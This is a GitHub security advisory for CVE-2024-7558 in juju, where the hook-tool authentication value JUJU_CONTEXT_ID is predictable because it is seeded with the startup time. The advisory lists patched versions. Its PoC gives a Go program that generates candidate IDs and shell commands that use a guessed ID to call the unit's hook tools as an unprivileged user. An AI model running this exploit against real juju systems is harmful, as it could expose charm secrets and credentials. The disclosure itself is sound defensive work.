# [M] JUJU_CONTEXT_ID is a predictable authentication secret

## Summary
Severity: Medium
Advisory: GHSA-mh98-763h-m9v4
CVE: CVE-2024-7558
CWE: CWE-1391, CWE-337, CWE-340
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H (CVSS_V3)
Published: 2024-10-03
Source: https://github.com/advisories/GHSA-mh98-763h-m9v4
Type: github-advisory

## Affected
- Go: `github.com/juju/juju` — affected >=0 <0.0.0-20240826044107-ecd7e2d0e986

## Details
`JUJU_CONTEXT_ID` is the authentication measure on the unit hook tool abstract domain socket. It looks like `JUJU_CONTEXT_ID=appname/0-update-status-6073989428498739633`.

This value looks fairly unpredictable, but due to the random source used, it is highly predictable.

`JUJU_CONTEXT_ID` has the following components:
- the application name
- the unit number
- the hook being currently run
- a uint63 decimal number

On a system the application name and unit number can be deduced by reading the structure of the filesystem.
The current hook being run is not easily deduce-able, but is a limited set of possible values, so one could try them all.
Finally the random number, this is generated from a non cryptographically secure random source. Specifically the random number generator built into the go standard library, using the current unix time in seconds (at startup) as the seed.

There is no rate limiting on the abstract domain socket, the only limiting factor is time (window of time the hook is run) and memory (how much memory is available to facilitate all the connections).

### Impact
On a juju machine (non-kubernetes) or juju charm container (on kubernetes), an unprivileged user in the same network namespace can connect to an abstract domain socket and guess the JUJU_CONTEXT_ID value. This gives the unprivileged user access to the same information and tools as the juju charm. This information could be secrets that give broader access.

### Patches
Patch: https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7
Patched in:
- 3.5.4
- 3.4.6
- 3.3.7
- 3.1.10
- 2.9.51

### Workarounds
No workaround. Upgrade will be required.

### References
https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L152
https://github.com/juju/juju/blob/a5b7876263365977bd3e583f5325facdae73fbe4/worker/uniter/runner/context/contextfactory.go#L164

### PoC
With a contrived example, a charm that sleeps indefinitely on its first hook, install. This charm is called sleepy.

```
.
|-- hooks
|   `-- install
#!/bin/sh
sleep 10000
|-- manifest.yaml
bases:
  - name: ubuntu
    channel: 22.04/stable
    architectures:
      - amd64
|-- metadata.yaml
name: sleepy
summary: a sleepy charm
description: a sleepy charm that sleeps on install
`-- revision
1
```

With sleepy deployed into a model, we have a unit with the name `sleepy/0` and an tag of `unit-sleepy-0`.

With access to the log file we can very quickly get the start time of the unit:
```
ubuntu@juju-5e40c0-0:~$ cat /var/log/juju/unit-sleepy-0.log | grep 'unit "sleepy/0" started'
2024-08-06 05:10:07 INFO juju.worker.uniter uniter.go:363 unit "sleepy/0" started
```

If we don't have access to the log, we could get pretty close by trying every second between when log file was created and now:
```
nobody@juju-5e40c0-0:/var/log/juju$ cat unit-sleepy-0.log
cat: unit-sleepy-0.log: Permission denied
nobody@juju-5e40c0-0:/var/log/juju$ stat unit-sleepy-0.log
  File: unit-sleepy-0.log
  Size: 1403      	Blocks: 8          IO Block: 4096   regular file
Device: 10302h/66306d	Inode: 25967076    Links: 1
Access: (0640/-rw-r-----)  Uid: (  104/  syslog)   Gid: (    4/     adm)
Access: 2024-08-06 05:10:48.686975042 +0000
Modify: 2024-08-06 05:10:07.159133215 +0000
Change: 2024-08-06 05:10:07.159133215 +0000
 Birth: 2024-08-06 05:10:06.965129276 +0000
```

We can then pass that into this program:
```
package main

import (
	"flag"
	"fmt"
	"math/rand"
	"time"
)

func main() {
	var unitName string
	var unitStartLogTime string
	var currentHook string
	flag.StringVar(&unitName, "u", "sleepy/0", "")
	flag.StringVar(&unitStartLogTime, "t", "2024-08-06 05:10:07", "time when the last 'INFO juju.worker.uniter uniter.go:363 unit %q started' log was written to /var/log/juju/unit-name-0.log")
	flag.StringVar(&currentHook, "h", "install", "the current hook that is running right now")
	flag.Parse()

	t, err := time.Parse("2006-01-02 15:04:05", unitStartLogTime)
	if err != nil {
		panic(err)
	}

	sources := []rand.Source{
		rand.NewSource(t.Unix()),
		rand.NewSource(t.Unix() - 1),
		rand.NewSource(t.Unix() - 2),
	}

	for i := 0; i < 10; i++ {
		for _, source := range sources {
			fmt.Printf("%s-%s-%d\n", unitName, currentHook, source.Int63())
		}
	}
}
```

This program will give us a list of `JUJU_CONTEXT_ID`s to try. We just need to try each one. In this case it was the first one, because we had enough information.

```
$ go run . -u sleepy/0 -t "2024-08-06 05:10:07" -h install
sleepy/0-install-7349430268617352851
sleepy/0-install-2171542415131519293
sleepy/0-install-6564961386023494624
sleepy/0-install-59904244413115609
sleepy/0-install-6073989428498739633
sleepy/0-install-2504995199508561544
sleepy/0-install-1526670560532335303
sleepy/0-install-2568216045630615950
sleepy/0-install-8047402353801897930
```

Unfortunately, this worked too well.
```
nobody@juju-5e40c0-0:/var/log/juju$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-sleepy-0/agent.socket JUJU_CONTEXT_ID=sleepy/0-install-7349430268617352851 /var/lib/juju/tools/unit-sleepy-0/is-leader
True
```

With a more sophisticated attack, this could discover all the units on the machine, using the update-status hook, try a few thousand attempts per second to guess the start time and the current offset in the random source, then using secret-get hook tool, get some sort of secret, such as credentials to a system.

## References
- https://github.com/juju/juju/security/advisories/GHSA-mh98-763h-m9v4
- https://nvd.nist.gov/vuln/detail/CVE-2024-7558
- https://github.com/juju/juju/commit/ecd7e2d0e9867576b9da04871e22232f06fa0cc7
- https://github.com/juju/juju
- https://pkg.go.dev/vuln/GO-2024-3173
